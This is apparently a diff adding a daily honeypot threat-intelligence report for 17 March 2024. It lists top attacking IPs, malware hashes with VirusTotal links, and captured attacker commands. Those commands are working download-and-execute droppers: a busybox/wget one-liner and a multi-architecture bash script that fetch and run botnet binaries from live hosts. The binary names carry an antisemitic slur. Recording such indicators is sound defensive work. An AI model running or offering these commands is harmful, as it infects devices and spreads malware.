@@ -1,0 +1,35 @@
+Top 5 IPs for 2024-03-17 :
+
+151.237.28.143
+172.245.214.201
+121.6.235.10
+185.206.69.13
+104.152.52.231
+
+Malware Download:
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+deddbbf7038cae78e4e5f5e62d3b9ce6ab4a8696e7e3519a444f1d8c5fb0eeb4
+https://www.virustotal.com/gui/file/deddbbf7038cae78e4e5f5e62d3b9ce6ab4a8696e7e3519a444f1d8c5fb0eeb4
+
+Malcious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://14.225.213.142/w.sh; sh w.sh; curl http://14.225.213.142/c.sh; sh c.sh; wget http://14.225.213.142/wget.sh; sh wget.sh; curl http://14.225.213.142/wget.sh; sh wget.sh; busybox wget http://14.225.213.142/wget.sh; sh wget.sh; busybox curl http://14.225.213.142/wget.sh; sh wget.sh
+
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.mips;wget http://103.153.69.99/fuckjewishpeople.mips; chmod +x fuckjewishpeople.mips; ./fuckjewishpeople.mips; rm -rf fuckjewishpeople.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.mpsl;wget http://103.153.69.99/fuckjewishpeople.mpsl; chmod +x fuckjewishpeople.mpsl; ./fuckjewishpeople.mpsl; rm -rf fuckjewishpeople.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.x86;wget http://103.153.69.99/fuckjewishpeople.x86; chmod +x fuckjewishpeople.x86; ./fuckjewishpeople.x86; rm -rf fuckjewishpeople.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.ppc;wget http://103.153.69.99/fuckjewishpeople.ppc; chmod +x fuckjewishpeople.ppc; ./fuckjewishpeople.ppc; rm -rf fuckjewishpeople.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.sparc;wget http://103.153.69.99/fuckjewishpeople.sparc; chmod +x fuckjewishpeople.sparc; ./fuckjewishpeople.sparc; rm -rf fuckjewishpeople.sparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm4;wget http://103.153.69.99/fuckjewishpeople.arm4; chmod +x fuckjewishpeople.arm4; ./fuckjewishpeople.arm4; rm -rf fuckjewishpeople.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm5;wget http://103.153.69.99/fuckjewishpeople.arm5; chmod +x fuckjewishpeople.arm5; ./fuckjewishpeople.arm5; rm -rf fuckjewishpeople.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm6;wget http://103.153.69.99/fuckjewishpeople.arm6; chmod +x fuckjewishpeople.arm6; ./fuckjewishpeople.arm6; rm -rf fuckjewishpeople.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 fuckjewishpeople.arm7;wget http://103.153.69.99/fuckjewishpeople.arm7; chmod +x fuckjewishpeople.arm7; ./fuckjewishpeople.arm7; rm -rf fuckjewishpeople.arm7
+
